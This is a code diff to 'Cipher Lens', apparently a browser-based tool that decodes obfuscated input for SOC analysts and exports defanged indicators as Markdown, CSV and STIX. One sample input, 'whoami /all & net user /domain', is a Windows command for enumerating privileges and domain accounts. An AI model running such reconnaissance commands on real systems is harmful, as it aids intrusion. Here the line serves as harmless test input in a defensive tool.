-  return '# Cipher Lens SOC report\n\n**Generated:** '+new Date().toISOString()+'  \n**Layers:** '+names.join(' > ')+'  \n**Triage hint:** '+risk+' (heuristic)\n\n**Original input:**\n'+f+'\n'+defang(stack[0])+'\n'+f+'\n\n**Final output:**\n'+f+'\n'+defang(cur())+'\n'+f+'\n\n**Indicators:**\n'+(ks.length?ks.map(k=>'- '+k+': '+[...F[k].v].map(v=>'`'+(k[0]!='S'&&dfk(k)?defang(v):v)+'`').join(', ')).join('\n'):'- none')}
+function md(){const F=analyze(cur()).F,ks=Object.keys(F),f='```',risk=summarizeRisk(F),path=names.slice(1).map((n,i)=>`${i+1}. ${n} (${explainDecode(n)})`).join('\n');
+  return '# Cipher Lens SOC report\n\n**Generated:** '+new Date().toISOString()+'  \n**Layers:** '+names.join(' > ')+'  \n**Triage hint:** '+risk.level+' ('+risk.score+'/100, heuristic)\n**Confidence:** '+risk.confidence+'\n\n**Decode path:**\n'+path+'\n\n**Original input:**\n'+f+'\n'+defang(stack[0])+'\n'+f+'\n\n**Final output:**\n'+f+'\n'+defang(cur())+'\n'+f+'\n\n**Indicators:**\n'+(ks.length?ks.map(k=>'- '+k+': '+[...F[k].v].map(v=>'`'+(k[0]!='S'&&dfk(k)?defang(v):v)+'`').join(', ')).join('\n'):'- none')}
 $('#bMd').onclick=()=>copy(md());
 $('#bIocCsv').onclick=()=>{
   const items=extractIocs(cur());if(!items.length)return toast('No indicators found');
   dl(['type,value',...items.map(x=>[x.type,x.value].map(csvCell).join(','))].join('\n'),'text/csv','csv');
 };
-function stixId(){const b=crypto.getRandomValues(new Uint8Array(16));b[6]=(b[6]&15)|64;b[8]=(b[8]&63)|128;const h=[...b].map(x=>x.toString(16).padStart(2,'0')).join('');return h.slice(0,8)+'-'+h.slice(8,12)+'-'+h.slice(12,16)+'-'+h.slice(16,20)+'-'+h.slice(20)}
+function stixId(){
+  const cryptoObj=globalThis.crypto;
+  const bytes=new Uint8Array(16);
+  if(cryptoObj&&typeof cryptoObj.getRandomValues==='function'){cryptoObj.getRandomValues(bytes)}else{for(let i=0;i<bytes.length;i++)bytes[i]=Math.floor(Math.random()*256)}
+  bytes[6]=(bytes[6]&15)|64;bytes[8]=(bytes[8]&63)|128;const h=[...bytes].map(x=>x.toString(16).padStart(2,'0')).join('');return h.slice(0,8)+'-'+h.slice(8,12)+'-'+h.slice(12,16)+'-'+h.slice(16,20)+'-'+h.slice(20)}
 $('#bStix').onclick=()=>{
   const F=analyze(cur()).F,now=new Date().toISOString(),objects=[];
   const add=(type,value,pattern)=>{const raw=refang(value).replace(/\\/g,'\\\\').replace(/'/g,"\\'");objects.push({type:'indicator',spec_version:'2.1',id:'indicator--'+stixId(),created:now,modified:now,name:type+' indicator',indicator_types:['malicious-activity'],pattern_type:'stix',pattern:pattern.replace('{value}',raw),valid_from:now,confidence:50})};
@@ -551,12 +662,20 @@ function md5(bytes){
     a0=(a0+a)>>>0;b0=(b0+b)>>>0;c0=(c0+c)>>>0;d0=(d0+d)>>>0}
   return[a0,b0,c0,d0].map(n=>[n&255,(n>>>8)&255,(n>>>16)&255,n>>>24].map(x=>x.toString(16).padStart(2,'0')).join('')).join('')
 }
+const hashCryptoSupported=()=>{
+  const c=globalThis.crypto;
+  const loc=globalThis.location||((typeof window !== 'undefined' && window.location)?window.location:null);
+  const secure=!!(loc && (loc.protocol==='https:' || loc.hostname==='localhost' || loc.hostname==='127.0.0.1')) || (typeof window !== 'undefined' && window.isSecureContext===true);
+  return !!(c&&c.subtle&&typeof c.subtle.digest==='function'&&secure);
+};
 async function showHashes(file,bytes){
-  $('#hashPanel').hidden=false;$('#hashName').textContent=file.name+' · '+bytes.length.toLocaleString()+' bytes';$('#hashOut').textContent='Calculating locally…';
+  $('#hashPanel').hidden=false;$('#hashName').textContent=file.name+' · '+bytes.length.toLocaleString()+' bytes';
+  if(!hashCryptoSupported()){ $('#hashOut').textContent='Hashing unavailable: this browser context is not secure enough for Web Crypto. Open the page via HTTPS or localhost, or use another tool to hash the file.'; return }
+  $('#hashOut').textContent='Calculating locally…';
   try{const fmt=async alg=>[...new Uint8Array(await crypto.subtle.digest(alg,bytes))].map(x=>x.toString(16).padStart(2,'0')).join('');
     const values={MD5:md5(bytes),'SHA-1':await fmt('SHA-1'),'SHA-256':await fmt('SHA-256')};
     $('#hashOut').textContent=Object.entries(values).map(([k,v])=>k+': '+v).join('\n');
-  }catch(e){$('#hashOut').textContent='Hashing failed: '+e.message+' (SHA hashes require a secure browser context).'}
+  }catch(e){$('#hashOut').textContent='Hashing failed: '+e.message+'. This browser may block Web Crypto in this context.'}
 }
 $('#bHashCopy').onclick=()=>$('#hashOut').textContent.startsWith('MD5:')?copy($('#hashOut').textContent):toast('No hashes ready to copy');
 async function loadFile(f){if(!f)return;
@@ -581,6 +700,8 @@ $('#bClear').onclick=clearAll;$('#bReset').onclick=clearAll;
 $('#bSample').onclick=()=>{if(mode=='bat'){setInput(batchSample());batch();return}if(mode=='enc'){setInput('whoami /all & net user /domain');return}setInput(sample());auto()};
 $('#bCopy').onclick=()=>copy(cur());
 $('#bHC').onclick=()=>{hist=[];renderHist()};
+$('#bSaveSession').onclick=()=>{saveSessionState();toast('Session saved locally');};
+$('#bLoadSession').onclick=()=>{if(!restoreSessionState())toast('No saved session found');};
 $('#bTheme').onclick=()=>{const h=document.documentElement,l=h.dataset.theme=='dark';h.dataset.theme=l?'light':'dark';$('#bTheme').textContent=l?'Dark mode':'Light mode'};
 $('#bIoc').onclick=()=>{const a=analyze(cur()).F,l=[];
   for(const k in a)if(k[0]!='S')for(const v of a[k].v)l.push(dfk(k)?defang(v):v);
@@ -595,7 +716,9 @@ $('#chain').addEventListener('click',e=>{const b=e.target.closest('[data-i]');if
 $('#iocs').addEventListener('click',e=>{const c=e.target.closest('[data-c]');if(c)copy(c.dataset.c)});
 $('#hist').addEventListener('click',e=>{const b=e.target.closest('[data-h]');if(!b)return;const h=hist[+b.dataset.h];
   stack=[...h.stack];names=[...h.names];$('#inp').value=stack[0];render()});
-render();renderHist();
+if(!restoreSessionState()){
+  render();renderHist();
+}
 </script>
 </body>
 </html>
